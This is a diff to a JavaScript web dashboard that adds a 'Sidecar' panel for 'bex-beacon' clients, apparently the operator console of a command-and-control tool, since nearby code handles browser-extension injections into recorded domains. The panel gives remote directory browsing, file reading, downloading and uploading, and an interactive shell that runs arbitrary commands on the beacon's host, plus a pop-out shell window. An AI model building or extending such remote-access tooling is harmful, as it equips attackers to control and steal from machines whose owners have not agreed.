@@ -2210,6 +2210,451 @@ async function toggleBexInjection(beaconID, domain, isActive) {
 }
 
 
+// ---- Sidecar Functions ----
+
+var _sidecarLastReadContent = null;
+var _sidecarLastReadFileName = null;
+var _sidecarCurrentPath = '';
+var _sidecarShellCwd = '';
+var _sidecarShellHistory = [];
+var _sidecarShellHistoryIndex = -1;
+var _sidecarShellOutput = '';
+var _sidecarShellBeaconId = '';
+var _sidecarShellNickname = '';
+
+function sidecarDownloadFile() {
+    if (!_sidecarLastReadContent || !_sidecarLastReadFileName) return;
+    try {
+        var raw = atob(_sidecarLastReadContent);
+        var arr = new Uint8Array(raw.length);
+        for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
+        var blob = new Blob([arr], { type: 'application/octet-stream' });
+        var url = URL.createObjectURL(blob);
+        var a = document.createElement('a');
+        a.href = url;
+        a.download = _sidecarLastReadFileName;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    } catch (e) {
+        console.error('Download failed:', e);
+    }
+}
+
+async function sidecarUploadFile(beaconId) {
+    var fileInput = document.getElementById('sidecar-upload-file');
+    var statusDiv = document.getElementById('sidecar-upload-status');
+    if (!fileInput || !statusDiv) return;
+
+    var file = fileInput.files[0];
+    if (!file) {
+        statusDiv.innerHTML = '<div class="alert alert-warning alert-sm py-1">No file selected.</div>';
+        return;
+    }
+
+    var maxSize = 700 * 1024;
+    if (file.size > maxSize) {
+        statusDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">File too large (' + formatSidecarBytes(file.size) + '). Maximum is 700 KB.</div>';
+        return;
+    }
+
+    var base = _sidecarCurrentPath || '/';
+    var sep = base.endsWith('/') || base.endsWith('\\') ? '' : '/';
+    var dest = base + sep + file.name;
+
+    statusDiv.innerHTML = '<div class="spinner-border spinner-border-sm text-primary" role="status"></div> Uploading...';
+
+    try {
+        var buffer = await file.arrayBuffer();
+        var bytes = new Uint8Array(buffer);
+        var binary = '';
+        for (var i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
+        var b64 = btoa(binary);
+
+        var resp = await fetch('/api/sidecar/command', {
+            method: 'POST',
+            body: JSON.stringify({ beaconID: beaconId, command: 'write_file', args: { path: dest, content: b64 } }),
+            headers: { "Content-type": "application/json" }
+        });
+
+        if (!resp.ok) {
+            var errText = await resp.text();
+            statusDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(errText) + '</div>';
+            return;
+        }
+
+        var json = await resp.json();
+        pollSidecarResult(json.requestId, function(result) {
+            if (!result.success) {
+                statusDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(result.error || 'Unknown error') + '</div>';
+                return;
+            }
+            statusDiv.innerHTML = '<div class="alert alert-success alert-sm py-1">Uploaded ' + formatSidecarBytes(result.data.bytesWritten) + ' to <b>' + escapeHTML(result.data.path) + '</b></div>';
+            fileInput.value = '';
+            sidecarBrowse(beaconId);
+        });
+    } catch (e) {
+        statusDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">Upload failed: ' + escapeHTML(String(e)) + '</div>';
+    }
+}
+
+async function sidecarBrowse(beaconId) {
+    var pathInput = document.getElementById('sidecar-path');
+    var path = pathInput ? pathInput.value : '/';
+    var resultsDiv = document.getElementById('sidecar-file-results');
+    if (!resultsDiv) return;
+    resultsDiv.innerHTML = '<div class="spinner-border spinner-border-sm text-primary" role="status"></div> Browsing...';
+
+    try {
+        var resp = await fetch('/api/sidecar/command', {
+            method: 'POST',
+            body: JSON.stringify({ beaconID: beaconId, command: 'list_dir', args: { path: path } }),
+            headers: { "Content-type": "application/json" }
+        });
+
+        if (!resp.ok) {
+            var errText = await resp.text();
+            resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(errText) + '</div>';
+            return;
+        }
+
+        var json = await resp.json();
+        pollSidecarResult(json.requestId, function(result) {
+            if (!result.success) {
+                resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(result.error) + '</div>';
+                return;
+            }
+            var entries = (result.data && result.data.entries) || [];
+            var resolvedPath = (result.data && result.data.path) || path;
+
+            // Update path input to resolved absolute path
+            _sidecarCurrentPath = resolvedPath;
+            if (pathInput) pathInput.value = resolvedPath;
+
+            var html = '<table class="table table-sm table-striped mb-0" style="font-size: 0.85em;">';
+            html += '<thead><tr><th>Name</th><th>Size</th><th>Modified</th><th></th></tr></thead><tbody>';
+
+            // Parent directory link
+            if (resolvedPath !== '/' && resolvedPath !== '') {
+                var parentPath = resolvedPath.replace(/\\/g, '/');
+                var parts = parentPath.split('/').filter(Boolean);
+                parts.pop();
+                var parent = parts.length === 0 ? '/' : '/' + parts.join('/');
+                // Windows: if path like C:/foo, parent should be C:/
+                if (/^[A-Za-z]:/.test(resolvedPath)) {
+                    var wparts = resolvedPath.replace(/\\/g, '/').split('/').filter(Boolean);
+                    wparts.pop();
+                    parent = wparts.length === 0 ? resolvedPath.substring(0, 3) : wparts.join('/');
+                }
+                html += '<tr><td><a href="#" onclick="sidecarNavigate(\'' + beaconId + '\', \'' + escapeHTML(parent).replace(/'/g, "\\'") + '\'); return false;">..</a></td><td></td><td></td><td></td></tr>';
+            }
+
+            entries.forEach(function(e) {
+                var sep = resolvedPath.endsWith('/') || resolvedPath.endsWith('\\') ? '' : '/';
+                var fullPath = resolvedPath + sep + e.name;
+                if (e.isDir) {
+                    html += '<tr><td><a href="#" onclick="sidecarNavigate(\'' + beaconId + '\', \'' + escapeHTML(fullPath).replace(/'/g, "\\'") + '\'); return false;">&#128193; ' + escapeHTML(e.name) + '/</a></td>';
+                } else {
+                    html += '<tr><td>' + escapeHTML(e.name) + '</td>';
+                }
+                html += '<td>' + (e.isDir ? '' : formatSidecarBytes(e.size)) + '</td>';
+                html += '<td><small>' + escapeHTML(e.modTime || '') + '</small></td>';
+                if (!e.isDir) {
+                    html += '<td><button class="btn btn-outline-primary btn-sm py-0 px-1" style="font-size:0.75em;" onclick="sidecarReadFile(\'' + beaconId + '\', \'' + escapeHTML(fullPath).replace(/'/g, "\\'") + '\')">Read</button></td>';
+                } else {
+                    html += '<td></td>';
+                }
+                html += '</tr>';
+            });
+            html += '</tbody></table>';
+            resultsDiv.innerHTML = html;
+        });
+    } catch (e) {
+        resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">Request failed: ' + escapeHTML(String(e)) + '</div>';
+    }
+}
+
+
+function sidecarNavigate(beaconId, path) {
+    var pathInput = document.getElementById('sidecar-path');
+    if (pathInput) pathInput.value = path;
+    sidecarBrowse(beaconId);
+}
+
+
+function sidecarShellUpdatePrompt() {
+    var prompt = document.getElementById('sidecar-shell-prompt');
+    if (prompt) prompt.textContent = (_sidecarShellCwd || '~') + ' $ ';
+}
+
+function sidecarShellAppendOutput(html) {
+    _sidecarShellOutput += html;
+    var outputDiv = document.getElementById('sidecar-shell-output');
+    if (outputDiv) {
+        outputDiv.innerHTML = _sidecarShellOutput;
+        outputDiv.scrollTop = outputDiv.scrollHeight;
+    }
+}
+
+function sidecarShellRemoveRunning(runId) {
+    var marker = 'id="shell-running-' + runId + '"';
+    _sidecarShellOutput = _sidecarShellOutput.replace(new RegExp('<div [^>]*' + marker.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '[^>]*>.*?</div>'), '');
+    var el = document.getElementById('shell-running-' + runId);
+    if (el) el.remove();
+}
+
+async function sidecarShellExec(beaconId) {
+    var cmdInput = document.getElementById('sidecar-shell-input');
+    var rawCmd = cmdInput ? cmdInput.value : '';
+    if (!rawCmd.trim()) return;
+    cmdInput.value = '';
+
+    _sidecarShellHistory.push(rawCmd);
+    _sidecarShellHistoryIndex = _sidecarShellHistory.length;
+
+    var cwdEscaped = _sidecarShellCwd.replace(/'/g, "'\\''");
+    var wrappedCmd;
+    if (_sidecarShellCwd) {
+        wrappedCmd = "cd '" + cwdEscaped + "' && " + rawCmd + "; echo '__SIDECAR_CWD__'; pwd";
+    } else {
+        wrappedCmd = rawCmd + "; echo '__SIDECAR_CWD__'; pwd";
+    }
+
+    var promptText = escapeHTML((_sidecarShellCwd || '~') + ' $ ' + rawCmd);
+    var runId = Date.now() + '' + Math.random();
+    sidecarShellAppendOutput('<div style="color:#6c9;white-space:pre-wrap;">' + promptText + '</div>');
+    sidecarShellAppendOutput('<div id="shell-running-' + escapeHTML(runId) + '" style="color:#888;"><span class="spinner-border spinner-border-sm" role="status"></span> Running...</div>');
+
+    try {
+        var resp = await fetch('/api/sidecar/command', {
+            method: 'POST',
+            body: JSON.stringify({ beaconID: beaconId, command: 'exec_cmd', args: { command: wrappedCmd } }),
+            headers: { "Content-type": "application/json" }
+        });
+
+        if (!resp.ok) {
+            var errText = await resp.text();
+            sidecarShellRemoveRunning(runId);
+            sidecarShellAppendOutput('<div style="color:#f55;white-space:pre-wrap;">ERROR: ' + escapeHTML(errText) + '</div>');
+            return;
+        }
+
+        var json = await resp.json();
+        pollSidecarResult(json.requestId, function(result) {
+            sidecarShellRemoveRunning(runId);
+            if (!result.success) {
+                sidecarShellAppendOutput('<div style="color:#f55;white-space:pre-wrap;">ERROR: ' + escapeHTML(result.error || 'Unknown error') + '</div>');
+                return;
+            }
+
+            var stdout = (result.data && result.data.stdout) || '';
+            var stderr = (result.data && result.data.stderr) || '';
+
+            // Parse CWD from stdout
+            var markerStr = '__SIDECAR_CWD__';
+            var markerIdx = stdout.lastIndexOf(markerStr);
+            if (markerIdx !== -1) {
+                var cmdOutput = stdout.substring(0, markerIdx).replace(/\n$/, '');
+                var newCwd = stdout.substring(markerIdx + markerStr.length).trim();
+                if (newCwd) _sidecarShellCwd = newCwd;
+                if (cmdOutput) {
+                    sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">' + escapeHTML(cmdOutput) + '</div>');
+                }
+            } else {
+                // Marker not found (timeout or binary output) — show all stdout
+                if (stdout) {
+                    sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">' + escapeHTML(stdout) + '</div>');
+                }
+            }
+
+            if (stderr) {
+                sidecarShellAppendOutput('<div style="color:#f55;white-space:pre-wrap;">' + escapeHTML(stderr) + '</div>');
+            }
+
+            sidecarShellUpdatePrompt();
+        });
+    } catch (e) {
+        sidecarShellRemoveRunning(runId);
+        sidecarShellAppendOutput('<div style="color:#f55;white-space:pre-wrap;">Request failed: ' + escapeHTML(String(e)) + '</div>');
+    }
+}
+
+function sidecarShellKeyHandler(event, beaconId) {
+    if (event.key === 'Enter') {
+        sidecarShellExec(beaconId);
+    } else if (event.key === 'ArrowUp') {
+        event.preventDefault();
+        if (_sidecarShellHistoryIndex > 0) {
+            _sidecarShellHistoryIndex--;
+            event.target.value = _sidecarShellHistory[_sidecarShellHistoryIndex];
+        }
+    } else if (event.key === 'ArrowDown') {
+        event.preventDefault();
+        if (_sidecarShellHistoryIndex < _sidecarShellHistory.length - 1) {
+            _sidecarShellHistoryIndex++;
+            event.target.value = _sidecarShellHistory[_sidecarShellHistoryIndex];
+        } else {
+            _sidecarShellHistoryIndex = _sidecarShellHistory.length;
+            event.target.value = '';
+        }
+    }
+}
+
+function sidecarPopOutShell(beaconId) {
+    var popWin = window.open('about:blank', '_blank', 'width=800,height=600,menubar=no,toolbar=no,location=no,status=no');
+    if (!popWin) { alert('Pop-up blocked. Please allow pop-ups for this site.'); return; }
+
+    var titleText = 'Sidecar Shell - ' + (_sidecarShellNickname || beaconId);
+    var transferState = {
+        beaconId: beaconId,
+        cwd: _sidecarShellCwd,
+        history: _sidecarShellHistory.slice(),
+        output: _sidecarShellOutput,
+        nickname: _sidecarShellNickname || beaconId
+    };
+
+    var htmlContent = '<!DOCTYPE html><html><head><title>' + escapeHTML(titleText) + '</title>' +
+    '<style>' +
+    '*, *::before, *::after { box-sizing: border-box; }' +
+    'body { margin:0; padding:0; background:#1e1e1e; color:#ddd; font-family:monospace; font-size:14px; display:flex; flex-direction:column; height:100vh; }' +
+    '#title-bar { background:#333; padding:6px 12px; display:flex; align-items:center; gap:8px; }' +
+    '#title-input { background:transparent; border:1px solid #555; color:#ddd; font-size:14px; flex:1; padding:2px 6px; border-radius:3px; font-family:monospace; }' +
+    '#title-input:focus { outline:none; border-color:#6c9; }' +
+    '#output { flex:1; overflow-y:auto; padding:8px 12px; }' +
+    '#input-bar { display:flex; align-items:center; padding:6px 12px; background:#252525; border-top:1px solid #444; gap:6px; }' +
+    '#prompt { color:#6c9; white-space:nowrap; }' +
+    '#cmd-input { flex:1; background:transparent; border:1px solid #555; color:#ddd; font-family:monospace; font-size:14px; padding:4px 6px; border-radius:3px; }' +
+    '#cmd-input:focus { outline:none; border-color:#6c9; }' +
+    '.btn-shell { background:#444; color:#ddd; border:1px solid #666; padding:4px 12px; border-radius:3px; cursor:pointer; font-size:13px; }' +
+    '.btn-shell:hover { background:#555; }' +
+    '</style></head><body>' +
+    '<div id="title-bar"><span style="color:#6c9;font-weight:bold;">&#9638;</span>' +
+    '<input id="title-input" value="' + escapeHTML(titleText).replace(/"/g, '&quot;') + '" oninput="document.title=this.value"></div>' +
+    '<div id="output">' + transferState.output + '</div>' +
+    '<div id="input-bar">' +
+    '<span id="prompt">' + escapeHTML((transferState.cwd || '~') + ' $ ') + '</span>' +
+    '<input id="cmd-input" type="text" autofocus>' +
+    '<button class="btn-shell" id="run-btn">Run</button>' +
+    '</div>' +
+    '<script>' +
+    '(function(){' +
+    'var beaconId=' + JSON.stringify(transferState.beaconId) + ';' +
+    'var cwd=' + JSON.stringify(transferState.cwd) + ';' +
+    'var history=' + JSON.stringify(transferState.history) + ';' +
+    'var histIdx=history.length;' +
+    'var accOutput=document.getElementById("output").innerHTML;' +
+    'function esc(s){if(!s)return"";return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/\'/g,"&#039;");}' +
+    'function appendOut(h){accOutput+=h;var o=document.getElementById("output");o.innerHTML=accOutput;o.scrollTop=o.scrollHeight;}' +
+    'function removeRunning(rid){var re=new RegExp(\'<div [^>]*id="shell-running-\'+rid.replace(/[.*+?^${}()|[\\]\\\\]/g,"\\\\$&")+\'"[^>]*>.*?</div>\');accOutput=accOutput.replace(re,"");var el=document.getElementById("shell-running-"+rid);if(el)el.remove();}' +
+    'function updatePrompt(){var p=document.getElementById("prompt");p.textContent=(cwd||"~")+" $ ";}' +
+    'function pollResult(reqId,cb,att){att=att||0;if(att>60){cb({success:false,error:"Timed out"});return;}var d=att<5?1000:3000;setTimeout(async function(){try{var r=await fetch("/api/sidecar/result/"+reqId);var j=await r.json();if(j.ready){cb(j);}else{pollResult(reqId,cb,att+1);}}catch(e){cb({success:false,error:"Poll failed: "+e});}},d);}' +
+    'async function runCmd(){var inp=document.getElementById("cmd-input");var raw=inp.value;if(!raw.trim())return;inp.value="";history.push(raw);histIdx=history.length;' +
+    'var cwdEsc=cwd.replace(/\'/g,"\'\\\\\'\'");var wrapped;' +
+    'if(cwd){wrapped="cd \'"+cwdEsc+"\' && "+raw+"; echo \'__SIDECAR_CWD__\'; pwd";}else{wrapped=raw+"; echo \'__SIDECAR_CWD__\'; pwd";}' +
+    'var pt=esc((cwd||"~")+" $ "+raw);var rid=Date.now()+""+Math.random();' +
+    'appendOut(\'<div style="color:#6c9;white-space:pre-wrap;">\'+pt+"</div>");' +
+    'appendOut(\'<div id="shell-running-\'+rid+\'" style="color:#888;"><span style="display:inline-block;width:12px;height:12px;border:2px solid #888;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite;"></span> Running...</div>\');' +
+    'try{var resp=await fetch("/api/sidecar/command",{method:"POST",body:JSON.stringify({beaconID:beaconId,command:"exec_cmd",args:{command:wrapped}}),headers:{"Content-type":"application/json"}});' +
+    'if(!resp.ok){var et=await resp.text();removeRunning(rid);appendOut(\'<div style="color:#f55;white-space:pre-wrap;">ERROR: \'+esc(et)+"</div>");return;}' +
+    'var json=await resp.json();pollResult(json.requestId,function(result){removeRunning(rid);if(!result.success){appendOut(\'<div style="color:#f55;white-space:pre-wrap;">ERROR: \'+esc(result.error||"Unknown error")+"</div>");return;}' +
+    'var stdout=(result.data&&result.data.stdout)||"";var stderr=(result.data&&result.data.stderr)||"";' +
+    'var mk="__SIDECAR_CWD__";var mi=stdout.lastIndexOf(mk);' +
+    'if(mi!==-1){var co=stdout.substring(0,mi).replace(/\\n$/,"");var nc=stdout.substring(mi+mk.length).trim();if(nc)cwd=nc;if(co)appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">\'+esc(co)+"</div>");}' +
+    'else{if(stdout)appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">\'+esc(stdout)+"</div>");}' +
+    'if(stderr)appendOut(\'<div style="color:#f55;white-space:pre-wrap;">\'+esc(stderr)+"</div>");updatePrompt();});}' +
+    'catch(e){removeRunning(rid);appendOut(\'<div style="color:#f55;white-space:pre-wrap;">Request failed: \'+esc(String(e))+"</div>");}}' +
+    'document.getElementById("cmd-input").addEventListener("keydown",function(ev){if(ev.key==="Enter"){runCmd();}else if(ev.key==="ArrowUp"){ev.preventDefault();if(histIdx>0){histIdx--;this.value=history[histIdx];}}else if(ev.key==="ArrowDown"){ev.preventDefault();if(histIdx<history.length-1){histIdx++;this.value=history[histIdx];}else{histIdx=history.length;this.value="";}}});' +
+    'document.getElementById("run-btn").addEventListener("click",runCmd);' +
+    'var o=document.getElementById("output");o.scrollTop=o.scrollHeight;' +
+    '})();' +
+    '</script>' +
+    '<style>@keyframes spin{to{transform:rotate(360deg)}}</style>' +
+    '</body></html>';
+
+    popWin.document.write(htmlContent);
+    popWin.document.close();
+}
+
+
+async function sidecarReadFile(beaconId, path) {
+    var resultsDiv = document.getElementById('sidecar-file-results');
+    if (!resultsDiv) return;
+    resultsDiv.innerHTML = '<div class="spinner-border spinner-border-sm text-primary" role="status"></div> Reading file...';
+
+    try {
+        var resp = await fetch('/api/sidecar/command', {
+            method: 'POST',
+            body: JSON.stringify({ beaconID: beaconId, command: 'read_file', args: { path: path } }),
+            headers: { "Content-type": "application/json" }
+        });
+
+        if (!resp.ok) {
+            var errText = await resp.text();
+            resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(errText) + '</div>';
+            return;
+        }
+
+        var json = await resp.json();
+        pollSidecarResult(json.requestId, function(result) {
+            if (!result.success) {
+                resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(result.error || 'Unknown error') + '</div>';
+                return;
+            }
+            var content = '';
+            try { content = atob(result.data.content); } catch(e) { content = result.data.content || ''; }
+
+            // Store for download
+            _sidecarLastReadContent = result.data.content;
+            var pathParts = path.replace(/\\/g, '/').split('/');
+            _sidecarLastReadFileName = pathParts[pathParts.length - 1] || 'download';
+
+            var backBtn = '<button class="btn btn-outline-secondary btn-sm mb-2" onclick="sidecarBrowse(\'' + beaconId + '\')">Back to directory</button>';
+            var dlBtn = ' <button class="btn btn-outline-primary btn-sm mb-2" onclick="sidecarDownloadFile()">Download</button>';
+            resultsDiv.innerHTML = backBtn + dlBtn +
+                '<div class="mb-1"><b>' + escapeHTML(path) + '</b> (' + formatSidecarBytes(result.data.size) + ')' +
+                (result.data.truncated ? ' <span class="badge bg-warning text-dark">Truncated</span>' : '') + '</div>' +
+                '<pre class="bg-dark text-white p-2" style="max-height: 500px; overflow-y: auto; white-space: pre-wrap; font-size: 0.8em;">' +
+                escapeHTML(content) + '</pre>';
+        });
+    } catch (e) {
+        resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">Request failed: ' + escapeHTML(String(e)) + '</div>';
+    }
+}
+
+
+function pollSidecarResult(requestId, callback, attempt) {
+    attempt = attempt || 0;
+    if (attempt > 60) { // ~3 minutes max
+        callback({ success: false, error: "Timed out waiting for result" });
+        return;
+    }
+    // Poll fast initially (1s for first 5 attempts), then slow down (3s)
+    var delay = attempt < 5 ? 1000 : 3000;
+    setTimeout(async function() {
+        try {
+            var resp = await fetch('/api/sidecar/result/' + requestId);
+            var json = await resp.json();
+            if (json.ready) {
+                callback(json);
+            } else {
+                pollSidecarResult(requestId, callback, attempt + 1);
+            }
+        } catch (e) {
+            callback({ success: false, error: "Poll failed: " + String(e) });
+        }
+    }, delay);
+}
+
+
+function formatSidecarBytes(bytes) {
+    if (bytes === undefined || bytes === null) return '';
+    if (bytes < 1024) return bytes + ' B';
+    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
+    return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
+}
+
+
 async function getClientDetails(id) 
 {
     if (refreshingDetails) return;
@@ -2251,13 +2696,98 @@ async function getClientDetails(id)
                 cardStack.firstChild.remove();
             }
             cardStack.setAttribute('data-loaded-id', id);
+
+            // Reset sidecar shell state on client switch
+            _sidecarCurrentPath = '';
+            _sidecarShellCwd = '';
+            _sidecarShellHistory = [];
+            _sidecarShellHistoryIndex = -1;
+            _sidecarShellOutput = '';
+            _sidecarShellBeaconId = '';
+            _sidecarShellNickname = '';
         }
 
         if (client && client.clientType === 'bex-beacon') {
             // Handle Beacon View
+
+            // Sidecar panel (if available)
+            if (client.sidecarAvailable) {
+                let sidecarPanel = document.getElementById('sidecar-panel');
+                if (!sidecarPanel) {
+                    // Store nickname and beacon id for shell
+                    _sidecarShellNickname = client.tag || client.nickname || '';
+                    _sidecarShellBeaconId = id;
+
+                    sidecarPanel = document.createElement('div');
+                    sidecarPanel.id = 'sidecar-panel';
+                    sidecarPanel.setAttribute('data-beacon-id', id);
+                    sidecarPanel.className = 'card mb-3 border-secondary';
+                    sidecarPanel.innerHTML = `
+                        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center" style="cursor:pointer;" data-bs-toggle="collapse" data-bs-target="#sidecar-collapse" aria-expanded="true" aria-controls="sidecar-collapse">
+                            <span><b>Sidecar</b> <span class="badge bg-success">Connected</span></span>
+                            <svg id="sidecar-chevron" width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style="transition: transform 0.25s ease;">
+                                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/>
+                            </svg>
+                        </div>
+                        <div class="collapse show" id="sidecar-collapse">
+                        <div class="card-body p-2">
+                            <ul class="nav nav-tabs" role="tablist">
+                                <li class="nav-item">
+                                    <button class="nav-link active" data-bs-toggle="tab" data-bs-target="#sidecar-files" type="button">File Browser</button>
+                                </li>
+                                <li class="nav-item">
+                                    <button class="nav-link" data-bs-toggle="tab" data-bs-target="#sidecar-shell" type="button">Shell</button>
+                                </li>
+                            </ul>
+                            <div class="tab-content border border-top-0 p-3">
+                                <div class="tab-pane fade show active" id="sidecar-files">
+                                    <div class="input-group mb-2">
+                                        <input type="text" class="form-control form-control-sm" id="sidecar-path" placeholder="/" value="">
+                                        <button class="btn btn-outline-primary btn-sm" onclick="sidecarBrowse('${id}')">Browse</button>
+                                    </div>
+                                    <div class="d-flex gap-2 mb-2 align-items-center flex-wrap">
+                                        <input type="file" class="form-control form-control-sm" id="sidecar-upload-file" style="max-width:250px;">
+                                        <button class="btn btn-outline-danger btn-sm" onclick="sidecarUploadFile('${id}')">Upload</button>
+                                    </div>
+                                    <div id="sidecar-upload-status"></div>
+                                    <div id="sidecar-file-results" style="max-height: 400px; overflow-y: auto;"></div>
+                                </div>
+                                <div class="tab-pane fade" id="sidecar-shell">
+                                    <div id="sidecar-shell-output" style="background:#1e1e1e; color:#ddd; font-family:monospace; font-size:13px; max-height:400px; overflow-y:auto; padding:8px 10px; border-radius:4px; margin-bottom:8px;"></div>
+                                    <div class="input-group">
+                                        <span class="input-group-text bg-dark text-success border-secondary" id="sidecar-shell-prompt" style="font-family:monospace; font-size:13px;">~ $ </span>
+                                        <input type="text" class="form-control form-control-sm bg-dark text-white border-secondary" id="sidecar-shell-input" style="font-family:monospace;" placeholder="type a command..." onkeydown="sidecarShellKeyHandler(event, '${id}')">
+                                        <button class="btn btn-outline-success btn-sm" onclick="sidecarShellExec('${id}')">Run</button>
+                                        <button class="btn btn-outline-secondary btn-sm" onclick="sidecarPopOutShell('${id}')" title="Pop out shell into separate window">Pop Out</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        </div>
+                    `;
+                    cardStack.prepend(sidecarPanel);
+
+                    // Chevron rotation on collapse/expand
+                    var collapseEl = document.getElementById('sidecar-collapse');
+                    if (collapseEl) {
+                        collapseEl.addEventListener('hide.bs.collapse', function() {
+                            var chev = document.getElementById('sidecar-chevron');
+                            if (chev) chev.style.transform = 'rotate(-90deg)';
+                        });
+                        collapseEl.addEventListener('show.bs.collapse', function() {
+                            var chev = document.getElementById('sidecar-chevron');
+                            if (chev) chev.style.transform = 'rotate(0deg)';
+                        });
+                    }
+
+                    // Auto-browse home directory on panel creation
+                    sidecarBrowse(id);
+                }
+            }
+
             var domainsReq = await fetch('/api/bex/domains/' + id);
             var domains = await domainsReq.json();
-            
+
             // Fetch active injections
             var injectionsReq = await fetch('/api/bex/injections/' + id);
             var injections = await injectionsReq.json();
@@ -2267,7 +2797,7 @@ async function getClientDetails(id)
             // Get all clients to find children
             var children = clients.filter(c => c.parentUUID === client.uuid);
 
-            if (domains.length === 0) {
+            if (domains.length === 0 && !client.sidecarAvailable) {
                 cardStack.innerHTML = `
                     <div class="mt-4 p-5 bg-dark text-white rounded text-center">
                         <h3>No Domains Recorded</h3>
